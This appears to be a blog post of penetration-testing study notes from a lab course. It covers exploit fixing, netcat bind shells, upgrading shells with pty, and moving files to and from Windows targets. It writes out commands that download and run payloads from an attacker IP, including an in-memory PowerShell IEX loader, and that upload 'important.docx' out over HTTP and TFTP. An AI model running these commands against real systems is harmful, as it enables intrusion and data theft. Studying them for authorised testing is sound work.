---
title: Study Notes - 2021/03/22
date: 2021-03-22 23:19:04
tags: [Penetration Testing, Study Notes]
---

# Fixing Memory Corruption Exploits 
searchsploit -m 42341  
copy the exploit   


# Cross-Cpmpiling the Exploit Code  
mingw-64 a cross-compiler  
sudo apt install mingw-w64  

# Changing the Socket Information  
# Change the payload  

# Fix Web Exploits  
make sure the certificate is ignored if face certificate check failed  
python request The official documentation394 indicates that the SSL certificate will be ignored if we set the verify
parameter to False  




# File Transfers  
# non-interactive shell  
on client, we open a listening shell: nc -nvlp 4444 -e /bin/bash  
in attack machine, connect to it nc -nv xxx.xx.xx.xxx 4444  
if we run ftp, we lose the interaction, input not binded correctly  

# upgrading the non-interactive shell  
nc -nvlp 4444 -e /bin/bash  
nc -nv 192.168.148.44 4444  

python -c 'import pty; pty.spawn("/bin/bash")'  
get a bash prompt, get the pty shell, good  

# Transfer file with windows hosts 
Non-interative ftp download  
sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/  

home directory of ftp is set to /ftphome/  

```
C:\Users\offsec>echo open 10.11.0.4 21> ftp.txt
C:\Users\offsec>echo USER offsec>> ftp.txt
C:\Users\offsec>echo lab>> ftp.txt
C:\Users\offsec>echo bin >> ftp.txt  # request a binary file transfer
C:\Users\offsec>echo GET nc.exe >> ftp.txt
C:\Users\offsec>echo bye >> ftp.txt

ftp -v -n -s:ftp.txt
```
-v to suppress any returned output, -n to suppresses automatic
login, and -s to indicate the name of our command file.  


# Windows Downloads using scripting languages

Use vb script
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >>
wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >>
wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

C:\Users\Offsec> cscript wget.vbs http://10.11.0.4/evil.exe evil.exe  

Use powershell :

```
C:\Users\Offsec> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
C:\Users\Offsec> echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1
C:\Users\Offsec> echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

```
C:\Users\Offsec> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -
NoProfile -File wget.ps1
```

First, we must allow execution of PowerShell scripts (which is restricted by default) with the -
ExecutionPolicy keyword and Bypass value. Next, we will use -NoLogo and -NonInteractive
to hide the PowerShell logo banner and suppress the interactive PowerShell prompt, respectively.
The -NoProfile keyword will prevent PowerShell from loading the default profile (which is not
needed), and finally we specify the script file with -File: 

one line version 
```
C:\Users\Offsec> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
```
```
C:\Users\Offsec> powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
```
download and execute without save to disk  


# Download with exe2hex and powershell
`upx -9 nc.exe` compress the binary file  
`exe2hex -x nc.exe -p nc.cmd  `  

pipling the file into clipboard:
```
cat nc.cmd | xclip -selection clipboard
```

oaste it into the non-interactive shell  


# windows upload using windows scripting language  
host a upload http server  

```
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

sudo mkdir /var/www/uploads   
sudo chown www-data: /var/www/uploads   

```
powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
```

# Uploading Files with TFTP
xp, 2003  

sudo chown nobody: /tftp  
sudo atftpd --daemon --port 69 /tftp    

in windows:  
tftp -i 10.11.0.4 put important.docx  



